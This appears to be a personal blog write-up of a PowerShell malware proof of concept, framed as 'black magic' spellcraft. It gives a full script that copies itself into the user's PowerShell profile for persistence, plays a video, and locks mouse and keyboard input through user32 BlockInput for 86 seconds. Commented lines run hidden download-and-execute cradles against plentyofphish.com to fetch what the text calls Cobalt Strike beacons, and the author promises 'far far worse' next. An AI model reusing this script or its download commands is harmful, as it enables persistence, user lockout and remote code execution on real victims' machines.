# Powershell Hexing for Rookies

Spell Class : Black Magic

Spell Level : Introduction

---


This was a very bad working PoC about powershell lock outs and doing some direct DLL manipulation.

Below is a .ps1 script that would drop this below script, A video, and a dumb beacon.

The goal of this was to act as a Hacktavist or some skid effect on a computer. It was very dumb but it was a perfect payload to mimic low skill and low complexity attack. 

### How it works

1. So first it attempts to find itself and adds that into the a profile.

2. It then add the .NET class to the current powershell session. That .Net class being presentationCore. I dont think I even used it looking back on this.. Real head scratcher....

3. We find our payload file which is a dumb downloaded youtube video. Following that I bind a new-object which is the Windows Media Player.

4. I then have the Windows media player Open the Media file, Then close the file. At the time I did this to solve a bug in the way it opens files.

5. Working with the proc var I made it brings the Windows MediaPlayer and plays the video. 

6. Now we see the DLLImport for user32.Dll I am calling very poorly the BlockIt function. Setting that to true disables all user32 input. Mouse, Keyboard, Touchscreen and anything else handled on the user. 

7. We see some mocking of the user and a sleep timers for 86 seconds. Once that is finished we return the BlockInput to false and fire off two CS beacons that are laying in wait online. 




```Powershell


$filethingy = (Get-Childitem -Path C:\ -Recurse -ErrorAction SilentlyContinue | where {$_.Name -match 'memoryfixer.ps1'}).FullName
$content = Get-Content -Path $filethingy

if (!(Test-Path $profile)) {
New-Item -ItemType File -Path $profile -Force 
Set-Content -Path $profile -Value $content
}else {
Set-Content -Path $profile -Value $content
}



Set-CoAdd-Type -AssemblyName presentationCore
$filepath = "C:\Windows\Temp\trap.mp4"
$wmplayer = New-Object System.Windows.Media.MediaPlayer
$wmplayer.Open($filepath)
Start-Sleep 1 
$duration = $wmplayer.NaturalDuration.TimeSpan.Seconds
$wmplayer.Close()
start playing
$proc = Start-process -FilePath "C:\Program Files (x86)\Windows Media Player\wmplayer.exe" -ArgumentList $filepath -PassThru



# This Bit locks the user out for 86 seconds

$code = @'
    [DllImport("user32.dll")]
        public static extern bool BlockInput(bool fBlockIt);
'@
        
        $userInput = Add-Type -MemberDefinition $code -Name Blocker -Namespace UserInput -PassThru
        
        
        $null = $userInput::BlockInput($true)
        
Write-Warning "You have just fell for the trap..."

        Start-Sleep -Seconds 86
        
       
        $null = $userInput::BlockInput($false)
        


Set-StrictMode -Version 2

#powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://plentyofphish.com:80/traptime'))"
#powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://plentyofphish.com:80/.exe'))"

#Runs above payloads

```



Once again this is very low and very poor. I wanted to throw this away but all information has value to someone and as such I hope you find some value in this poorly crafted spell. Good news however is it means we can work from here and build something far far worse now that we can get into the concept of ASM and maybe some malicious payloads.
